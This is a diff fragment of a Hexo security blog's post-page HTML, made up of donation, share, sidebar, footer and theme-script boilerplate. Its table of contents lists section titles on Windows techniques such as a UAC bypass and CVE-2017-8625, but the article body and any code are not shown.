+                <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title="微信打赏" class="fancybox" rel="article0"
+                    style="margin-right:30%">
+                    <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title="" height="164px" width="164px">
+                </a>
+            
+            -->
+            <table>
+                <tr>
+                    <td>
+                        
+                            <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title="支付宝打赏" class="fancybox" rel="article0" style="float:left;margin-left:25%;margin-right:10px;">
+                                <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title height="164px" width="164px">
+                            </a> 
+                         
+                    </td>
+                    <td>
+                        
+                            <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title="微信打赏" class="fancybox" rel="article0" style="margin-right:30%">
+                                <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title height="164px" width="164px">
+                            </a>
+                        
+                    </td>
+                </tr>
+            </table>
+
+        </div>
+
+        <script type="text/javascript">
+            document.getElementById('btn_donate').onclick = function() {
+                $('#donate_board').addClass('hidden');
+                // $('#donate_guide').removeClass('hidden');
+                $('#donate_guide').show(2000);
+            }
+
+        </script>
+    </div>
+
+    
+
+
+      
+    </div>
+
+    <div class="post-spread">
+      
+        <div class="bdsharebuttonbox">
+	<a href="#" class="bds_more" data-cmd="more"></a>
+	<a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+	<a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a>
+	<a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+</div>
+<script>
+    window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+  </div>
+
+ </div>
+
+        
+
+        
+          <div class="comments" id="comments">
+            
+              <div class="ds-thread" data-thread-key="每日安全干货及动态-1.html" data-title="每日安全干货及动态--第二期" data-url="www.ggsec.cn/每日安全干货及动态-1.html">
+              </div>
+            
+          </div>
+        
+      </div>
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" src="/images/default_avatar.jpg" alt="Demon‘blog | 没有绝对安全的系统" itemprop="image">
+          <p class="site-author-name" itemprop="name">Demon‘blog | 没有绝对安全的系统</p>
+        </div>
+        <p class="site-description motion-element" itemprop="description">kali|linux|sec|Web|MSF|Win</p>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">156</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">9</span>
+              <span class="site-state-item-name">分类</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">15</span>
+              <span class="site-state-item-name">标签</span>
+              </a>
+          </div>
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="menu-item-icon icon-next-feed"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://www.secist.com" target="_blank">即刻安全</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.airs-sec.com" target="_blank">小城工作室</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://linux.dog" target="_blank">泡泡博客</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.webshell.ren" target="_blank">THE博客</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://isbase.cc/" target="_blank">zusheng</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/demonsec666" target="_blank">Demon(Github)</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.inksec.cn" target="_blank">Szrzvdny</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.xsafe.org/" target="_blank">xsafe</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://bestsec.net" target="_blank">Bang'Blog</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.sqlsec.com" target="_blank">国光</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://droidkali.github.io" target="_blank">记忆纯真</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.frostsaber.com/" target="_blank">FrostsaberX 's Blog</a>
+              </span>
+            
+          
+        </div>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="450" src="//music.163.com/outchain/player?type=0&id=377915817&auto=0&height=430"></iframe>
+<div class="links-of-friendly motion-element">
+          
+        </div>
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#安全项目"><span class="nav-number">1.</span> <span class="nav-text">安全项目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-Forfiles-弹计算器"><span class="nav-number">2.</span> <span class="nav-text">1.Forfiles ( 弹计算器)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#演示如图："><span class="nav-number">2.1.</span> <span class="nav-text">演示如图：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-CVE-2017-8625-HTML-IE"><span class="nav-number">3.</span> <span class="nav-text">2.CVE-2017-8625 -HTML-IE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#演示如图：-1"><span class="nav-number">3.1.</span> <span class="nav-text">演示如图：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-UAC-TokenMagic-ps1绕UAC"><span class="nav-number">4.</span> <span class="nav-text">3.UAC-TokenMagic.ps1绕UAC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#如图所示："><span class="nav-number">4.1.</span> <span class="nav-text">如图所示：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-Subvert-PE-shellcode-Powershell-弹计算器"><span class="nav-number">5.</span> <span class="nav-text">4.Subvert-PE-shellcode- (Powershell 弹计算器)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Code"><span class="nav-number">5.1.</span> <span class="nav-text">Code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#视频演示："><span class="nav-number">5.2.</span> <span class="nav-text">视频演示：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-Invoke-CreateProcess-Powershell-弹计算器"><span class="nav-number">6.</span> <span class="nav-text">5.Invoke-CreateProcess (Powershell 弹计算器)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Code-1"><span class="nav-number">6.1.</span> <span class="nav-text">Code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#如图所示"><span class="nav-number">6.2.</span> <span class="nav-text">如图所示</span></a></li></ol></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner"> <div class="copyright">
+  
+  &copy; &nbsp; 
+  <span itemprop="copyrightYear">2019
+  </span>
+  <span class="with-love">
+    <i class="icon-next-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Demon‘blog | 没有绝对安全的系统
+  </span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme by <a class="theme-link" href="http://blog.idhyt.com">idhyt</a>.<a class="theme-link" href="https://github.com/idhyt/hexo-theme-next/tree/magiclamp">Mala</a>
+</div>
+
+<!-- busuanzi -->
+
+  <div class="busuanzi-info">
+    <div class="theme-info">
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <span id="busuanzi_container_site_pv">
+        本站总访问量<a class="theme-link"><span id="busuanzi_value_site_pv"></span></a>次 |
+	本站访客数<span id="busuanzi_value_site_uv"></span>人次
+    </span>
+</div>
+
+  </div>
+
+
+
+ </div>
+    </footer>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+    
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"demonsec"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+    
+
+    
+  
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.1"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.1"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.5.1" id="motion.global"></script>
+
+
+
+
+  <script type="text/javascript" src="/js/nav-toggle.js?v=0.4.5.1"></script>
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.5.1" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.motion.complete', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      var $indicator = $(indicator);
+      var opacity = action === 'show' ? 0.4 : 0;
+      $indicator.velocity ?
+        $indicator.velocity('stop').velocity({
+          opacity: opacity
+        }, { duration: 100 }) :
+        $indicator.stop().animate({
+          opacity: opacity
+        }, 100);
+    }
+
+  });
+</script>
+
+<script type="text/javascript" id="sidebar.nav">
+  $(document).ready(function () {
+    var html = $('html');
+    var TAB_ANIMATE_DURATION = 200;
+    var hasVelocity = $.isFunction(html.velocity);
+
+    $('.sidebar-nav li').on('click', function () {
+      var item = $(this);
+      var activeTabClassName = 'sidebar-nav-active';
+      var activePanelClassName = 'sidebar-panel-active';
+      if (item.hasClass(activeTabClassName)) {
+        return;
+      }
+
+      var currentTarget = $('.' + activePanelClassName);
+      var target = $('.' + item.data('target'));
+
+      hasVelocity ?
+        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
+            .addClass(activePanelClassName);
+        }) :
+        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
+          currentTarget.hide();
+          target
+            .stop()
+            .css({'opacity': 0, 'display': 'block'})
+            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
+              currentTarget.removeClass(activePanelClassName);
+              target.addClass(activePanelClassName);
+            });
+        });
+
+      item.siblings().removeClass(activeTabClassName);
+      item.addClass(activeTabClassName);
+    });
+
+    $('.post-toc a').on('click', function (e) {
+      e.preventDefault();
+      var targetSelector = escapeSelector(this.getAttribute('href'));
+      var offset = $(targetSelector).offset().top;
+      hasVelocity ?
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        }) :
+        $('html, body').stop().animate({
+          scrollTop: offset
+        }, 500);
+    });
+
+    // Expand sidebar on post detail page by default, when post has a toc.
+    var $tocContent = $('.post-toc-content');
+    if (isDesktop() && CONFIG.sidebar === 'post') {
+      if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+        displaySidebar();
+      }
+    }
+  });
+</script>
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+      if (isMobile()) {
+        FastClick.attach(document.body);
+      }
+    });
+  </script>
+
+  
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/lazyload.js"></script>
+  <script type="text/javascript">
+    $(function () {
+      $("#posts").find('img').lazyload({
+        placeholder: "/images/loading.gif",
+        effect: "fadeIn"
+      });
+    });
+  </script>
+</body>
+</html>
